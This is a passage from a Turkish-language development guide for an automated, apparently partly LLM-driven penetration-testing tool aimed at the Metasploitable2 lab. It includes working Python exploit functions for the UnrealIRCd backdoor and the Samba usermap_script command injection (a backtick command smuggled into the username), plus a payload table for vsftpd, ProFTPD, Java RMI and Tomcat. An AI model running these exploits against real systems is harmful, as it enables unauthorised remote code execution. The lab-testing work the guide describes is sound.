
```python
def trigger_unrealircd_backdoor(host: str, port: int, command: str) -> str:
    """
    UnrealIRCd 3.2.8.1 backdoor: 'AB;' prefix'i ile komut gonderilir.
    """
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    # Backdoor tetikle
    s.sendall(f"AB; {command}\n".encode())
    time.sleep(2)
    result = s.recv(4096).decode(errors="ignore")
    s.close()
    return result
```

### 7.3 ruby_drb_rce

**Sorun:** Payload 14 byte, yanıt 0 byte.
**Çözüm:** Geçerli Ruby 1.8 marshal gadget.

```python
def build_ruby_drb_gadget(command: str) -> bytes:
    """
    Ruby 1.8 DRb marshal gadget (Gem::Requirement + Gem::Installer).
    Not: Bu, hedefe ozel bir gadget zinciridir; metasploit'teki
    'ruby_drb_rce' modulune benzer.
    """
    # Gercek gadget zinciri icin:
    # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/ruby_drb_rce.rb
    # Burada basitlestirilmis bir ornek:
    import marshal
    # ... (gadget zinciri)
    return b""
```

### 7.4 samba_usermap (CVE-2007-2447)

**Sorun:** Enjeksiyon gönderiliyor ama doğrulama yok.
**Çözüm:** Komut çıktısını SMB share'den oku.

```python
def samba_usermap_exploit(host: str, command: str) -> str:
    """
    Samba 3.0.20 usermap_script RCE.
    username = "/=`nohup <cmd> 2>&1 | tee /tmp/out`"
    """
    import subprocess
    # smbclient ile enjeksiyon
    username = f'/=`nohup {command} 2>&1 | tee /tmp/art_out`'
    cmd = f"smbclient //{host}/tmp -U '{username}%x' -c 'ls' 2>&1"
    subprocess.run(cmd, shell=True, timeout=30)
    # Ciktiyi oku
    read_cmd = f"smbclient //{host}/tmp -N -c 'get art_out /tmp/art_out' 2>&1"
    subprocess.run(read_cmd, shell=True, timeout=30)
    try:
        with open("/tmp/art_out") as f:
            return f.read()
    except Exception:
        return ""
```

### 7.5 Diğer Payload'lar

| Exploit | Sorun | Çözüm |
|---|---|---|
| vsftpd_backdoor | Port 6200 kapalı | `USER test:)` + `PASS`; yoksa "hedefte yok" raporla |
| proftpd_modcopy | mod_copy yok (1.3.1) | `SITE CPFR/CPTO` kontrol; yoksa raporla |
| java_rmi_deserialize | Protokol farklı | `ysoserial` gadget veya registry `list` |
| tomcat_manager_deploy | Timeout | Timeout 60s; port kontrolü; default creds |
| vnc_null_auth | Port kapalı | Port kontrolü; açıksa RFB handshake |

---

## 8. Test Stratejisi

### 8.1 Test Piramidi

```
        /\
       /  \      E2E (gerçek metasploitable2) - 5 test
      /----\
     /      \    Entegrasyon (mock hedef) - 20 test
    /--------\
   /          \  Unit (her modül) - 100+ test
  /------------\
```

### 8.2 Test Komutları

```bash
# Tüm testler
python -m pytest tests/ -q

# Tek modül
python -m pytest tests/test_vuln_mapper.py -v

# Coverage
python -m pytest tests/ --cov=core --cov-report=html

# Gerçek hedef testi (Docker çalışırken)
python -m pytest tests/test_e2e_metasploitable.py -v --run-e2e
```

### 8.3 Mock Stratejisi

Her modül için `run_command` mock'lanır:

```python
from unittest.mock import patch

def test_something():
    with patch("core.vuln_mapper.run_command", return_value="mock output"):
        result = vuln_mapper.map_service("vsftpd", "2.3.4", 21)
    assert result
```

### 8.4 E2E Test (Gerçek Hedef)

```python
"""Gerçek metasploitable2'ye karşı E2E test (Docker gerekir)."""
import pytest
from core.recon_engine import recon_engine
from core.vuln_mapper import vuln_mapper
from core.exploit_planner import ExploitPlanner


@pytest.mark.e2e
def test_full_pipeline():
    # 1. Recon
    recon = recon_engine.run_full_recon("metasploitable2")
    assert len(recon.services) >= 15

    # 2. Mapping
    vulns = vuln_mapper.map_all(recon.services)
    assert len(vulns) >= 10

    # 3. Planning
    planner = ExploitPlanner("metasploitable2")
    plan = planner.build_plan(vulns)
    assert len(plan) >= 5
```

---

## 9. Entegrasyon ve Geçiş Planı

### 9.1 Kademeli Geçiş (Geriye Uyumluluk)

Mevcut sistemi bozmadan yeni modülleri ekle:

**Adım 1:** Yeni modülleri yaz (mevcut kod dokunulmaz)
```
core/vuln_mapper.py       (YENİ)
core/exploit_planner.py   (YENİ)
core/verifier.py          (YENİ)
core/state_machine.py     (YENİ)
```

**Adım 2:** `assessment_assistant.py`'ye yeni bir metot ekle
```python
def run_deterministic(self) -> List[Dict]:
    """Yeni deterministik akış (LLM'siz)."""
    recon = recon_engine.run_full_recon(self.target)
    vulns = vuln_mapper.map_all(recon.services)
    planner = ExploitPlanner(self.target)
    planner.build_plan(vulns)
    # ... döngü
```

**Adım 3:** UI'ya "Deterministik Mod" seçeneği ekle
```python
# assessment_ui.py
mode = request.args.get("mode", "llm")  # llm | deterministic
if mode == "deterministic":
    assistant.run_deterministic()
else:
    assistant.run()
```

**Adım 4:** Test et, karşılaştır, sonra eski akışı kaldır.

### 9.2 Dosya Değişiklik Özeti

| Dosya | İşlem | Açıklama |
|---|---|---|
| `core/vuln_mapper.py` | YENİ | Servis→CVE eşlemesi |
| `core/exploit_planner.py` | YENİ | İstismar planı |
| `core/verifier.py` | YENİ | Kanıt doğrulama |
| `core/state_machine.py` | YENİ | Faz geçişleri |
| `core/credential_engine.py` | YENİ | Kimlik bilgisi |
| `core/web_exploit_engine.py` | YENİ | Web istismar |
| `core/post_exploit.py` | YENİ | Foothold sonrası |
| `core/finding_correlator.py` | YENİ | Bulgu korelasyonu |
| `core/cvss_scorer.py` | YENİ | CVSS skoru |
| `core/assessment_assistant.py` | DEĞİŞTİR | `run_deterministic()` ekle |
| `core/exploit_runner.py` | DEĞİŞTİR | Payload düzeltmeleri |
| `core/orchestrator.py` | DEĞİŞTİR | Danışman rolüne indir |
| `assessment_ui.py` | DEĞİŞTİR | Mod seçeneği |
| `config/scope.yaml` | YENİ | Dinamik scope |
| `knowledge_base/cve_exploit_map.json` | YENİ | Yerel KB |

### 9.3 Kontrol Listesi (Her Modül İçin)

- [ ] Modül yazıldı
- [ ] `to_dict()` eklendi
- [ ] Kapsam kontrolü (`is_target_allowed`) eklendi
- [ ] Denetim logu (`_log_audit`) eklendi
- [ ] Unit test yazıldı ve geçiyor
- [ ] Mevcut testler bozulmadı (`pytest tests/ -q`)
- [ ] Gerçek hedefte test edildi (Docker)
- [ ] Dokümantasyon güncellendi

### 9.4 Önerilen Geliştirme Takvimi

| Hafta | İş | Çıktı |
|---|---|---|
| 1 | vuln_mapper + exploit_planner + verifier | Deterministik çekirdek |
| 2 | state_machine + payload düzeltmeleri | İstismar çalışır |
| 3 | credential_engine + web_exploit_engine | Kapsam genişler |
| 4 | post_exploit + finding_correlator | Derinlik + kalite |
| 5 | LLM danışman entegrasyonu | Otonomi |
| 6 | cvss_scorer + rapor + gerçek dünya | Bug bounty hazır |

---

## 10. Sık Yapılan Hatalar ve Çözümleri

| Hata | Çözüm |
|---|---|
| `run_command` Docker yokken çalışmaz | Test'te mock'la; E2E için Docker başlat |
| `searchsploit --json` formatı değişebilir | Parse'ı defansif yaz (try/except) |
| Exploit payload'ları hedefe özel | Her payload'ı gerçek hedefte doğrula |
| LLM hâlâ karar vermeye çalışır | Prompt'u netleştir: "sadece payload üret" |
| Bulgu tekrarı | `finding_correlator.deduplicate()` kullan |
| Kapsam dışı hedef | Her modülde `is_target_allowed` kontrolü |

---

## 11. Kaynaklar

- **Metasploitable2 zafiyet listesi:** https://docs.rapid7.com/metasploit/metasploitable-2/
- **Exploit-DB:** https://www.exploit-db.com/
- **NVD API:** https://nvd.nist.gov/developers/vulnerabilities
- **CVSS v3.1:** https://www.first.org/cvss/v3.1/specification-document
- **OWASP WSTG:** https://owasp.org/www-project-web-security-testing-guide/
- **MITRE ATT&CK:** https://attack.mitre.org/

---

*Bu rehber, mevcut kod tabanının analizi üzerine kurulmuştur. Her modül
mevcut projedeki pattern'lere uygun yazılmıştır. Geliştirmeye
`core/vuln_mapper.py` ile başla.*
